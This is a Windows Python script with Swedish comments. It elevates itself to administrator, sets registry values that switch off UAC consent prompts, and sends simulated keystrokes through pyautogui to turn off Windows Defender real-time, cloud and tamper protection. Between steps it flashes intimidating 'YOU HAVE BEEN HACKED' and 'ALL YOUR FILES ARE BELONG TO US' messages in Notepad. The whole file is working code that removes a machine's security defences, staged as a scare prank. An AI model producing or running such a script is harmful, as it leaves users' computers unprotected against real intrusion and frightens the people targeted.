import ctypes
import subprocess
import sys
import time

# ----------------------------------------------------------------------
# Självhöjning till admin
# ----------------------------------------------------------------------

def _is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def _elevate():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable,
        " ".join(f'"{a}"' for a in sys.argv),
        None, 1
    )
    sys.exit(0)


if not _is_admin():
    print("Startar om som administratör...")
    _elevate()


# ----------------------------------------------------------------------
# Resten
# ----------------------------------------------------------------------

import winreg
import pyautogui

pyautogui.FAILSAFE = True
pyautogui.PAUSE = 0.03


# ----------------------------------------------------------------------
# "Hacker show" – öppna Notepad, skriv skräckinjagande text, stäng
# ----------------------------------------------------------------------

def hack_show(title, lines, hold=1.5, type_speed=0.02):
    """Öppna Notepad, skriv ett meddelande, döda processen."""
    # Öppna Notepad via Run-dialogen
    pyautogui.hotkey("win", "r")
    time.sleep(0.3)
    pyautogui.write("notepad", interval=0.01)
    pyautogui.press("enter")
    time.sleep(0.8)

    # Skriv titeln
    pyautogui.write(title, interval=type_speed)
    pyautogui.press("enter")
    pyautogui.press("enter")

    # Skriv alla rader
    for line in lines:
        pyautogui.write(line, interval=type_speed)
        pyautogui.press("enter")

    # Låt texten synas en stund
    time.sleep(hold)

    # Döda Notepad utan att fråga om att spara
    subprocess.run(
        ["taskkill", "/IM", "notepad.exe", "/F"],
        capture_output=True,
    )
    time.sleep(0.4)


# ----------------------------------------------------------------------
# Riktiga jobbet
# ----------------------------------------------------------------------

def disable_uac():
    path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    with winreg.OpenKey(
        winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_SET_VALUE
    ) as key:
        winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0,
                          winreg.REG_DWORD, 0)
        winreg.SetValueEx(key, "PromptOnSecureDesktop", 0,
                          winreg.REG_DWORD, 0)
    print("UAC avstängt i registret.")


def disable_defender():
    pyautogui.hotkey("win", "r")
    time.sleep(0.3)
    pyautogui.write("windowsdefender://threat", interval=0.03)
    pyautogui.press("enter")
    time.sleep(2.5)

    pyautogui.press("tab")
    pyautogui.press("tab")
    pyautogui.press("tab")
    pyautogui.press("tab")
    pyautogui.press("enter")
    time.sleep(2.0)

    pyautogui.press("space")
    time.sleep(1.5)

    pyautogui.press("tab")
    time.sleep(1.5)
    pyautogui.press("tab")
    time.sleep(1.5)
    pyautogui.press("tab")
    time.sleep(1.5)
    pyautogui.press("space")
    time.sleep(1.5)

    pyautogui.press("tab")
    time.sleep(1.5)
    pyautogui.press("space")
    time.sleep(1.5)

    pyautogui.press("tab")
    time.sleep(1.5)
    pyautogui.press("tab")
    time.sleep(1.5)
    pyautogui.press("space")
    time.sleep(1.5)


# ----------------------------------------------------------------------
# Start
# ----------------------------------------------------------------------

if __name__ == "__main__":

    # ---- Show 1: Initiering ----
    hack_show(
        ">> SYSTEM BREACH INITIATED <<",
        [
            "",
            "[*] Connecting to target...",
            "[*] Target:  LOCALHOST",
            "[*] Bypassing firewall... OK",
            "[*] Establishing backdoor... OK",
            "",
            ">>> YOU HAVE BEEN HACKED <<<",
            "",
            "[*] Deploying payload...",
        ],
        hold=2.0,
    )

    print("Steg 1: Stänger av UAC...")
    disable_uac()
    time.sleep(2)

    # ---- Show 2: UAC nere ----
    hack_show(
        ">> UAC BYPASSED <<",
        [
            "",
            "[-] User Account Control ...... DISABLED",
            "[-] Security prompts .......... BYPASSED",
            "[-] Admin consent ............. GRANTED",
            "",
            ">>> ACCESS GRANTED <<<",
        ],
        hold=1.5,
    )

    print("Steg 2: Stänger av Windows Defender...")
    disable_defender()
    time.sleep(2)

    # ---- Show 3: Allt nere ----
    hack_show(
        ">> SYSTEM FULLY COMPROMISED <<",
        [
            "",
            "[-] Real-time protection ...... OFF",
            "[-] Cloud protection .......... OFF",
            "[-] Tamper protection ......... OFF",
            "[-] Firewall .................. BYPASSED",
            "",
            ">>> ALL YOUR FILES ARE BELONG TO US <<<",
            "",
            "        [ connection closed ]",
        ],
        hold=2.5,
    )

    print("Klart.")